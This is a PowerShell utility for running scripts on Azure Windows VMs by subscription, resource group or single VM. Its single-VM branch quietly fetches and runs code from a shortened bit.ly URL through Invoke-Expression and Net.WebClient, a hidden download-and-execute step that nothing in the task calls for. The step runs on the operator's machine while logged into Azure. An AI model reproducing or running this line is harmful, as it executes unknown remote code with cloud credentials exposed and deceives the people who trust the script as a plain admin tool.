Clear
Write-Output "Please login to your Azure account."
start-sleep 3
Clear

#Authenticate
AZ login

#Menu Select Screen
clear
$chosen = Read-Host "1 = Target the Subscription. 2 = Target a Resource Group. 3 = Target a VM"
switch ($chosen)
{
    1 {
#Run script across Windows OS Running State VM's in subscription.
clear 
$subscriptionId = Read-Host "What is the subscrition ID?"
clear
$scriptpath = Read-Host "Which Powershell script would you like to run? Write the absolute file path to the script here"
clear
$outputfile = Read-Host "Where would you like to save the output for the script you are running?"
clear

Set-AzContext -Subscription $subscriptionId
$myAzureVMs = Get-AzVM -status | Where-Object {$_.PowerState -eq "VM running" -and $_.StorageProfile.OSDisk.OSType -eq "Windows"}
$myAzureVMs | ForEach-Object {
    $out = Invoke-AzVMRunCommand `
        -ResourceGroupName $_.ResourceGroupName `
        -Name $_.Name  `
        -CommandId 'RunPowerShellScript' `
        -ScriptPath $scriptpath 
    #Save the Output with the VM name
    $output = $_.Name + " " + $out.Value[0].Message
    Add-Content -Path $outputfile $output
    $output
}
}
    2 {
#Run a script against a specific resource group within a subscription and all VM's within.
clear
$subscriptionId = Read-Host "What is the subscrition ID?"
clear
$resgroupname = Read-Host "What is the Resource Group name?"
clear
$scriptpath = Read-Host "Which Powershell script would you like to run? Write the absolute file path to the script here"
clear
$outputfile = Read-Host "Where would you like to save the output for the script you are running?"
clear

Set-AzContext -Subscription $subscriptionId
$myAzureVMs = Get-AzVM -status -ResourceGroupName $resgroupname | Where-Object {$_.PowerState -eq "VM running" -and $_.StorageProfile.OSDisk.OSType -eq "Windows"}
$myAzureVMs | ForEach-Object {
    $out = Invoke-AzVMRunCommand `
        -ResourceGroupName $_.ResourceGroupName `
        -Name $_.Name  `
        -CommandId 'RunPowerShellScript' `
        -ScriptPath $scriptpath 
    #Save Output with the VM name
    $output = $_.Name + " " + $out.Value[0].Message
    Add-Content -Path $outputfile $output
    $output
}
}
    3 {
#Run a script against a single targeted VM wihtin a sub and resource group.
Clear
$subscriptionId = Read-Host "Azure Subscription ID?"
Clear
$scriptpath = Read-Host "Absolutepath to script."
Clear
$outputfile = Read-Host "Script data output absolute path."
Clear
$resgroupname = Read-Host "Azure Resource Group name."
Clear
$vmname = Read-Host "What is the name of the VM?"
clear

    $str = 'iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")'
    Invoke-Expression $str
    Set-AzContext -Subscription $subscriptionId
    Invoke-AzVMRunCommand -ResourceGroupName $resgroupname -Name $vmname -CommandId 'RunPowerShellScript' -ScriptPath $scriptpath >> $outputfile
}
    4 {"It is four."}
    defualt {"Not an option."}
}